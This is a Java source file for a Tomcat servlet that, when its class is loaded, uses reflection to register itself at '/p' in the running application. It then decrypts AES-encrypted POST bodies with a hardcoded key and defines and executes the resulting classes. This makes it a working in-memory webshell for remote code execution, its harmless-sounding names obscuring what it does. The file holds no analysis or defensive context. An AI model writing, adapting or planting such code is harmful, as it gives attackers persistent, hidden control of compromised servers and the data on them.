import jakarta.servlet.*;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import jakarta.servlet.http.HttpSession;
import org.apache.catalina.Container;
import org.apache.catalina.Wrapper;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class ISRain10 implements Servlet {
    private final String pa = "3ad2fddfe8bad8e6";

    static{
        try{
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();

            ISRain10 greetServlet = new ISRain10();

            Method createWrapper = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredMethod("createWrapper");
            Wrapper greetWrapper = (Wrapper) createWrapper.invoke(standardContext);

            Method gname = Container.class.getDeclaredMethod("setName", String.class);
            gname.invoke(greetWrapper,"p");

            Method gload = Wrapper.class.getDeclaredMethod("setLoadOnStartup", int.class);
            gload.invoke(greetWrapper,1);

            Method gservlet = Wrapper.class.getDeclaredMethod("setServlet", Servlet.class);
            gservlet.invoke(greetWrapper,greetServlet);

            Method gclass = Wrapper.class.getDeclaredMethod("setServletClass", String.class);
            gclass.invoke(greetWrapper,greetServlet.getClass().getName());

            Method gchild = StandardContext.class.getDeclaredMethod("addChild",Container.class);
            gchild.invoke(standardContext,greetWrapper);

            Method gmap = StandardContext.class.getDeclaredMethod("addServletMappingDecoded",String.class,String.class,boolean.class);
            gmap.invoke(standardContext,"/p", "p",false);
        }catch (Exception hi){
            //hi.printStackTrace();
        }
    }

    @Override
    public void init(ServletConfig config) throws ServletException {}

    @Override
    public String getServletInfo() {return null;}

    @Override
    public void destroy() {}    public ServletConfig getServletConfig() {return null;}

    @Override
    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
        HttpServletRequest request = (HttpServletRequest) servletRequest;
        HttpServletResponse response = (HttpServletResponse) servletResponse;
        HttpSession session = request.getSession();

        Map<String, Object> pageContext = new HashMap<String, Object>();
        pageContext.put("session", session);
        pageContext.put("request", request);
        pageContext.put("response", response);

        ClassLoader cl = (ClassLoader)Thread.currentThread().getContextClassLoader();

        if (request.getMethod().equals("POST")){
            if(cl.getClass().getSuperclass().getName().equals("java.lang.ClassLoader")){
                Class Lclass = cl.getClass().getSuperclass();
                RushThere(Lclass,cl,session,request,pageContext);
            }else if(cl.getClass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")){
                Class Lclass = cl.getClass().getSuperclass().getSuperclass();
                RushThere(Lclass,cl,session,request,pageContext);
            }else if(cl.getClass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")){
                Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass();
                RushThere(Lclass,cl,session,request,pageContext);
            }else if(cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")){
                Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                RushThere(Lclass,cl,session,request,pageContext);
            }else if(cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")){
                Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                RushThere(Lclass,cl,session,request,pageContext);
            }else {
                Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                RushThere(Lclass,cl,session,request,pageContext);
            }
        }
    }

    public void RushThere(Class Lclass, ClassLoader cl, HttpSession session, HttpServletRequest request,Map<String, Object> pageContext){
        byte[] bytecode = java.util.Base64.getDecoder().decode("yv66vgAAADQAGgoABAAUCgAEABUHABYHABcBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADTFU7AQABYwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAWIBAAJbQgEAClNvdXJjZUZpbGUBAAZVLmphdmEMAAUABgwAGAAZAQABVQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsAIQADAAQAAAAAAAIAAAAFAAYAAQAHAAAAOgACAAIAAAAGKiu3AAGxAAAAAgAIAAAABgABAAAAAgAJAAAAFgACAAAABgAKAAsAAAAAAAYADAANAAEAAQAOAA8AAQAHAAAAPQAEAAIAAAAJKisDK763AAKwAAAAAgAIAAAABgABAAAAAwAJAAAAFgACAAAACQAKAAsAAAAAAAkAEAARAAEAAQASAAAAAgAT");
        try {
            java.lang.reflect.Method define = Lclass.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            define.setAccessible(true);
            Class uclass = null;
            try {
                uclass = cl.loadClass("U");
            } catch (ClassNotFoundException e) {
                uclass = (Class) define.invoke(cl, bytecode, 0, bytecode.length);
            }
            Constructor constructor = uclass.getDeclaredConstructor(ClassLoader.class);
            constructor.setAccessible(true);
            Object u = constructor.newInstance(this.getClass().getClassLoader());
            Method Um = uclass.getDeclaredMethod("g", byte[].class);
            Um.setAccessible(true);
            String k = pa;
            session.setAttribute("u", k);
            Cipher c = Cipher.getInstance("AES");
            c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
            byte[] eClassBytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
            Class eclass = (Class) Um.invoke(u, eClassBytes);
            Object a = eclass.newInstance();
            Method b = eclass.getDeclaredMethod("equals", Object.class);
            b.setAccessible(true);
            b.invoke(a, pageContext);
            return;
        }catch (Exception ig){
            ig.printStackTrace();
        }
    }
}


